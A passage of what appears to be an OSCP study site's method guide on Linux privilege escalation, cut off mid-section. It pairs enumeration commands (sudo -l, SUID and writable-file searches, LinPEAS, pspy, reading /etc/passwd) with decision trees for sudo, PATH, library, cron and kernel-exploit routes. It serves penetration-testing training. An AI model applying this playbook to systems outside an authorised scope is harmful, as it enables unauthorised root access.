href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details open><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details open><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/" aria-current="page">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="escalate-privileges-on-linux">Escalate privileges on Linux</h1>
+<p><a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | <a href="/oscp/notes/Master_Notes/">Master Notes</a> | <a href="/oscp/">Operational index</a> | <a href="/oscp/cheatsheets/">Cheatsheets</a></p>
+<p>For each candidate prove controlled object → effective permission → privileged consumer → execution identity → trigger → effect. Enumeration tools suggest candidates; they do not establish that chain.</p>
+<p><strong>Speedrun blocks:</strong> 8. <strong>Documented methods:</strong> 16.</p>
+<p>Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.</p>
+<h2 id="first-pass-tools-and-findings">First pass: tools and findings</h2>
+<p>Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.</p>
+<h3 id="identify-the-session-then-run-linpeas-early">Identify the session, then run LinPEAS early</h3>
+<p>After checking id, architecture and shell availability, transfer a trusted reviewed LinPEAS copy using the transfer procedure. The sh invocation does not need an executable bit. Save output; use the local -h before selecting optional flags.</p>
+<pre><code class="language-bash">id
+uname -m
+command -v bash python3
+ls -ld /tmp
+</code></pre>
+<pre><code class="language-bash">sh ./linpeas.sh | tee linpeas.txt
+</code></pre>
+<ul>
+<li><strong>If sudo/NOPASSWD or an allowed binary:</strong> Run sudo -l and compare run-as, exact path and permitted arguments with the chosen escape. → <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>.</li>
+<li><strong>If A root-owned SUID binary:</strong> Check the exact file, mount flags and its available privileged operation. → <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</li>
+<li><strong>If A useful file capability:</strong> Match the capability to the exact executable operation and mount. → <a href="/oscp/notes/methods/linux-privesc/#linux-capabilities">Use a file capability that enables a specific privileged operation</a>.</li>
+<li><strong>If A password, key or application config:</strong> Read the source file and identify which account/service it belongs to. → <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</li>
+<li><strong>Otherwise:</strong> LinPEAS cannot run or shows no usable finding: use the native identity/permissions checks; quiet output does not prove no escalation. → <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</li>
+</ul>
+<h3 id="check-sudo-rules-against-the-actual-binary">Check sudo rules against the actual binary</h3>
+<p>Use only the operation permitted by the entire rule. Select the matching GTFOBins mode/build instead of trying every example.</p>
+<pre><code class="language-bash">sudo -n -l 2>&#x26;1
+sudo -l
+</code></pre>
+<ul>
+<li><strong>If (root) NOPASSWD permits a useful interpreter/helper:</strong> Check argument restrictions and privilege retention, then use that exact permitted invocation. → <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>.</li>
+<li><strong>If LD_PRELOAD is explicitly permitted/preserved:</strong> Verify a dynamically linked allowed program and the variable-setting permission. → <a href="/oscp/notes/methods/linux-privesc/#linux-preload">Load a controlled library through a permitted sudo environment</a>.</li>
+<li><strong>Otherwise:</strong> No useful sudo rule: check SUID/SGID and capabilities; do not keep trying sudo payloads. → <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</li>
+</ul>
+<h3 id="catch-short-lived-root-jobs-with-pspy">Catch short-lived root jobs with pspy</h3>
+<p>Use a reviewed binary matching the target architecture; keep it running long enough to observe the suspected schedule. Stop after collecting the needed events.</p>
+<pre><code class="language-bash">./pspy64
+</code></pre>
+<ul>
+<li><strong>If UID=0 repeatedly invokes a script under /opt or another path:</strong> Check the script and each parent with namei/stat/getfacl, then identify the schedule/trigger. → <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>.</li>
+<li><strong>If A privileged job invokes a helper without an absolute path:</strong> Inspect the real PATH and a writable directory searched first. → <a href="/oscp/notes/methods/linux-privesc/#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>.</li>
+<li><strong>Otherwise:</strong> No event was observed: inspect cron/timers/services directly rather than assuming no privileged job exists. → <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>.</li>
+</ul>
+<h3 id="test-suidcapability-findings-manually">Test SUID/capability findings manually</h3>
+<p>Use native discovery alongside the tool output; a flagged executable is only useful if it retains a relevant privilege.</p>
+<pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+findmnt -T /PATH/TO/BINARY
+</code></pre>
+<ul>
+<li><strong>If A root-owned SUID program exposes a usable operation:</strong> Check nosuid, exact build and effective identity after that operation. → <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</li>
+<li><strong>If An executable has a useful file capability:</strong> Check the named capability and its effective operation under this mount. → <a href="/oscp/notes/methods/linux-privesc/#linux-capabilities">Use a file capability that enables a specific privileged operation</a>.</li>
+<li><strong>If A root-consumed file/parent is writable:</strong> Validate the real consumer and trigger before modification. → <a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</li>
+<li><strong>Otherwise:</strong> No useful privileged executable: return to secrets, scheduled consumers, mounts and local-only services. → <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</li>
+</ul>
+<h2 id="discovery-workflow">Discovery workflow</h2>
+<p>Start with a low-privileged Linux command channel. No sudo rule, writable privileged script or usable SUID binary is assumed.</p>
+<p>Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.</p>
+<ol>
+<li>Establish effective IDs/groups, mounts, processes and exact sudo rules: <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</li>
+<li>Follow readable application/history/process artifacts into typed credentials: <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</li>
+<li>Inspect sudo/SUID/capabilities and prove effective object/parent permissions: <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-capabilities">Use a file capability that enables a specific privileged operation</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</li>
+<li>Identify each job/service's real identity, consumed path and trigger; only then examine resolution abuse: <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-wildcard">Turn wildcard-expanded filenames into privileged command options</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-library">Control a privileged program's shared-library resolution</a>.</li>
+<li>Investigate daemon/mount/software candidates against their exact conditions: <a href="/oscp/notes/methods/linux-privesc/#linux-containers">Use privileged group, daemon or container-management control</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-mounts">Exploit a permission-backed mount, NFS mapping or local service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-kernel">Select an evidence-matched Linux software or kernel exploit</a>.</li>
+</ol>
+<p><strong>Decision rule:</strong> an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.</p>
+<h2 id="method-families">Method families</h2>
+<ul>
+<li><strong>Identity, permissions and secret sources:</strong> <a href="#linux-state">Establish Linux state and choose an escalation candidate</a>, <a href="#linux-permissions">Prove effective file, directory, ACL and mount control</a>, <a href="#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</li>
+<li><strong>Delegated and executable privilege:</strong> <a href="#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>, <a href="#linux-preload">Load a controlled library through a permitted sudo environment</a>, <a href="#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>, <a href="#linux-capabilities">Use a file capability that enables a specific privileged operation</a>.</li>
+<li><strong>Privileged consumers and resolution:</strong> <a href="#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>, <a href="#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>, <a href="#linux-wildcard">Turn wildcard-expanded filenames into privileged command options</a>, <a href="#linux-library">Control a privileged program's shared-library resolution</a>, <a href="#linux-policy">Change a writable account or privilege-policy file</a>.</li>
+<li><strong>Daemon, mount and software routes:</strong> <a href="#linux-containers">Use privileged group, daemon or container-management control</a>, <a href="#linux-mounts">Exploit a permission-backed mount, NFS mapping or local service</a>, <a href="#linux-kernel">Select an evidence-matched Linux software or kernel exploit</a>.</li>
+<li><strong>Candidate generation:</strong> <a href="#linux-enumerators">Use enumeration tools to generate manually testable candidates</a>.</li>
+</ul>
+<h2 id="choose-a-method">Choose a method</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Recognition clue</th><th>Required access</th><th>Enabling conditions</th><th>Resulting capability</th></tr></thead><tbody><tr><td><a href="#linux-state">Establish Linux state and choose an escalation candidate</a></td><td>A new Linux foothold or an identity/privilege change</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>A working command channel and accurate effective identity, group, mount and process context</td><td>An evidence-ranked escalation queue and a verified current privilege state</td></tr><tr><td><a href="#linux-permissions">Prove effective file, directory, ACL and mount control</a></td><td>A root-consumed file or directory appears writable</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately</td><td>A validated controlled object suitable for a specific execution or credential chain</td></tr><tr><td><a href="#linux-secrets">Recover credentials from Linux user, service and process trails</a></td><td>Readable configuration, shell history, environment, process arguments or session sockets</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Read access to the artifact; exact account/service context; session/agent access must include a usable live identity</td><td>Typed credentials or an explicitly authorized usable session capability</td></tr><tr><td><a href="#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a></td><td>sudo -l grants an operation under a more useful identity</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it</td><td>A verified privileged command, file operation or identity transition</td></tr><tr><td><a href="#linux-preload">Load a controlled library through a permitted sudo environment</a></td><td>A sudo rule explicitly preserves or permits a loader variable</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Allowed variable setting/preservation, a dynamically linked permitted executable and a loader path that honors it</td><td>Verified privileged library initialization under the permitted run-as identity</td></tr><tr><td><a href="#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a></td><td>A nonstandard or dangerous privileged executable</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege</td><td>A verified privileged file operation or effective UID/GID transition</td></tr><tr><td><a href="#linux-capabilities">Use a file capability that enables a specific privileged operation</a></td><td>An interpreter/helper has an effective high-value capability</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>The exact capability is effective in the execution context; mount/namespace/bounding-set restrictions permit its use</td><td>The specific privileged operation or identity transition enabled by that capability</td></tr><tr><td><a href="#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a></td><td>Root-owned cron, systemd or recurring process activity uses a controllable object</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger</td><td>Verified execution or a useful file operation under the job/service identity</td></tr><tr><td><a href="#linux-path">Hijack an unqualified helper through controlled PATH resolution</a></td><td>A privileged program/job invokes a helper without an absolute path</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>A controlled directory precedes the real helper in the consumer's effective PATH; execution preserves useful privilege and a trigger exists</td><td>Verified execution of the chosen helper under the consumer identity</td></tr><tr><td><a href="#linux-wildcard">Turn wildcard-expanded filenames into privileged command options</a></td><td>A privileged job passes an uncontrolled directory glob to an option-parsing utility</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Control of expanded filenames; compatible option parsing and argument placement; useful program feature and privileged trigger</td><td>A verified unintended privileged utility operation</td></tr><tr><td><a href="#linux-library">Control a privileged program's shared-library resolution</a></td><td>A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger</td><td>Verified privileged initialization or behavior of a controlled shared object</td></tr><tr><td><a href="#linux-policy">Change a writable account or privilege-policy file</a></td><td>Account metadata or a privilege-policy file appears writable</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Effective write/replace permission, known file syntax and a useful identity/policy consumer; preserve the original</td><td>A verified account or policy-backed privilege transition</td></tr><tr><td><a href="#linux-containers">Use privileged group, daemon or container-management control</a></td><td>Membership or socket ACLs permit controlling a rootful daemon or useful session</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation</td><td>A verified privileged daemon operation or host-relevant access</td></tr><tr><td><a href="#linux-mounts">Exploit a permission-backed mount, NFS mapping or local service</a></td><td>A writable/exported filesystem or a loopback-only service with useful privileges</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Relevant export/mount options or service authentication; effective identity, writable path and any privileged execution consumer</td><td>A useful file/credential operation or verified local service access</td></tr><tr><td><a href="#linux-kernel">Select an evidence-matched Linux software or kernel exploit</a></td><td>Permission/credential paths are insufficient and an exact affected build/configuration is present</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Vulnerable package/kernel state, architecture, mitigations, namespaces and documented exploit-specific conditions</td><td>A justified local exploit test and independently verified privilege result</td></tr><tr><td><a href="#linux-enumerators">Use enumeration tools to generate manually testable candidates</a></td><td>A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths</td><td>A verified Linux foothold with a known effective UID, groups and filesystem context</td><td>Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location</td><td>Candidate permissions, credentials and consumers for manual validation</td></tr></tbody></table>
+<p><a id="linux-state"></a></p>
+<h2 id="establish-linux-state-and-choose-an-escalation-candidate">Establish Linux state and choose an escalation candidate</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#1-establish-current-state">Operational procedure</a> | <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#16-verify-and-re-enumerate">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result">1. Purpose and result</h3>
+<p>An evidence-ranked escalation queue and a verified current privilege state.</p>
+<h3 id="2-recognition-clues">2. Recognition clues</h3>
+<p>A new Linux foothold or an identity/privilege change.</p>
+<h4 id="find-the-clue-from-your-starting-access">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">id
+findmnt
+ps auxww
+sudo -l
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">uid=USER_ID(APP_USER) groups=APP_GROUP
+(root) NOPASSWD: /usr/bin/find
+root ... /bin/sh /OPT_PATH/backup.sh
+</code></pre>
+<p><strong>Recognize this detail:</strong> The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice.</p>
+<p><strong>Still missing before method selection:</strong> For each candidate establish exact permitted operation/object, run-as identity and trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A candidate's complete permission/consumer chain is validated: choose that specific method.</td></tr><tr><td>Ruled out in this context</td><td>A highlighted process belongs to the same low user: reject its assumed privilege gain.</td></tr><tr><td>Inconclusive</td><td>Permission-denied inventory is incomplete visibility; use known application paths and supported built-ins.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> A working command channel and accurate effective identity, group, mount and process context.</p>
+<h3 id="4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">hostname
+id
+uname -a
+cat /etc/os-release
+findmnt
+sudo -l
+</code></pre>
+<h3 id="5-why-it-works">5. Why it works</h3>
+<p>Privileges belong to effective identity and execution context, not a username string. A container root UID can differ from host root; a new identity changes readable files and available controls.</p>
+<h3 id="6-execute-and-choose-variants">6. Execute and choose variants</h3>
+<blockquote>
+<p><strong>Decisive output:</strong> current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules.</p>
+</blockquote>
+<pre><code class="language-bash">hostname; id; groups
+uname -a; cat /etc/os-release; getconf LONG_BIT
+pwd; umask; env
+ip addr; ip route; ss -lntup; ss -lxnp
+ps auxf
+mount; findmnt; lsblk; df -hT
+sudo -n -l 2>&#x26;1
+sudo -l
+</code></pre>
+<pre><code class="language-bash">getent passwd
+awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd
+</code></pre>
+<blockquote>
+<p><strong>Priority:</strong> credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel.</p>
+</blockquote>
+<pre><code class="language-bash">id; whoami; groups
+hostname; pwd
+ip addr; ip route
+</code></pre>
+<p>After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private.</p>
+<h3 id="7-worked-example--hypothetical">7. Worked example — hypothetical</h3>
+<p>Observation: a shell runs as an application account. Test: collect identity, sudo rules and root-owned activity. Illustrative output: one permitted interpreter and a writable backup directory. Interpretation: validate those specific consumers before selecting a kernel exploit.</p>
+<h3 id="8-verify-the-result">8. Verify the result</h3>
+<p>Record effective UID/groups, host/namespace and the exact candidate permission; re-check identity after every claimed escalation.</p>
+<h3 id="9-failure-and-fallback">9. Failure and fallback</h3>
+<p>Missing tools or permission-denied inventory is partial visibility. Use built-ins and inspect concrete application paths rather than claiming no escalation path exists.</p>
+<h3 id="10-next-transitions">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-containers">Use privileged group, daemon or container-management control</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-kernel">Select an evidence-matched Linux software or kernel exploit</a>.</p>
+<p><a id="linux-permissions"></a></p>
+<h2 id="prove-effective-file-directory-acl-and-mount-control">Prove effective file, directory, ACL and mount control</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#2-prove-permissions-including-parents-and-mounts">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-1">1. Purpose and result</h3>
+<p>A validated controlled object suitable for a specific execution or credential chain.</p>
+<h3 id="2-recognition-clues-1">2. Recognition clues</h3>
+<p>A root-consumed file or directory appears writable.</p>
+<h4 id="find-the-clue-from-your-starting-access-1">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT
+findmnt -T /PATH/TO/OBJECT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">file: root-owned, not directly writable
+parent: current group has write+execute
+mount: rw
+</code></pre>
+<p><strong>Recognize this detail:</strong> Parent replacement can provide a control primitive even when the existing file's write bit is absent.</p>
+<p><strong>Still missing before method selection:</strong> Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The precise object can be replaced and is consumed under a higher identity: choose that control path.</td></tr><tr><td>Ruled out in this context</td><td>Parent/file rights do not grant the needed operation: reject that proposed write.</td></tr><tr><td>Inconclusive</td><td>An ACL listing without effective trustee/mount context leaves control unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-1">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately.</p>
+<h3 id="4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT
+findmnt -T /PATH/TO/OBJECT
+</code></pre>
+<h3 id="5-why-it-works-1">5. Why it works</h3>
+<p>Directory write plus traversal can allow replacement without direct file write. ACLs, sticky directories, immutable attributes and mount options can change the effective operation.</p>
+<h3 id="6-execute-and-choose-variants-1">6. Execute and choose variants</h3>
+<pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
+</code></pre>
+<blockquote>
+<p>Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. <code>nosuid</code> defeats SUID/SGID and file-capability effects; <code>noexec</code> blocks direct execution; <code>ro</code> blocks changes.</p>
+</blockquote>
+<p>Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under <code>/etc</code>, <code>/opt</code>, <code>/usr/local</code>, application paths and service working directories:</p>
+<pre><code class="language-bash">find / -xdev -type f -writable -ls 2>/dev/null
+find / -xdev -type d -writable -ls 2>/dev/null
+</code></pre>
+<h3 id="7-worked-example--hypothetical-1">7. Worked example — hypothetical</h3>
+<p>Observation: a service script is read-only but its parent is writable. Test: inspect replacement rights and the service's actual path. Illustrative output: the caller can replace the exact consumed object. Interpretation: the control primitive exists; now verify privileged identity and trigger.</p>
+<h3 id="8-verify-the-result-1">8. Verify the result</h3>
+<p>Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain.</p>
+<h3 id="9-failure-and-fallback-1">9. Failure and fallback</h3>
